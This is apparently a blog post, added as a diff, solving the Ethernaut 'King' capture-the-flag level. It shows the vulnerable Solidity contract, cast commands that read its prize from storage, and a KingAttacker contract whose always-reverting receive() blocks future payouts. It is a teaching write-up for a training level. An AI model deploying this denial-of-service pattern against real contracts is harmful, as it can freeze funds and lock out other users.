@@ -1,0 +1,86 @@
+---
+title: Ethernaut - King - Solution
+date: '2024-05-07'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - King CTF
+---
+
+# Ethernaut - King - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+
+## Exploit
+
+The goal of this level is to become the king forever.
+
+First, we can inspect how much funds we have to send to the contract to become the new king:
+
+```bash
+cast storage <your level instance address> 1 --rpc-url $SEP_RPC_URL
+# Result: 0x00000000000000000000000000000000000000000000000000038d7ea4c68000
+
+cast to-dec 0x00000000000000000000000000000000000000000000000000038d7ea4c68000
+# Result: 1000000000000000
+```
+
+This tells us that the prize is 1 Finney.
+
+Second, we see that `receive()` sends funds to the current king before assigning the new king.
+This means we can solve this level by deploying an attacker contract that contains
+
+1. a function that allows it to become the new king and
+2. a `receive()` function that always reverts.
+
+In other words, we can use Remix to deploy the following attacker contract and subsequently call `becomeKing()` specifying a value of at least 1 Finney.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract KingAttacker {
+    address public immutable LEVEL_INSTANCE;
+
+    constructor(address levelInstance) {
+        LEVEL_INSTANCE = levelInstance;
+    }
+
+    function becomeKing() external payable {
+        (bool success, ) = payable(LEVEL_INSTANCE).call{value: msg.value}("");
+        require(success, "Transfer failed");
+
+    }
+
+    receive() external payable {
+        revert("Long live Marco XLII");
+    }
+}
+```
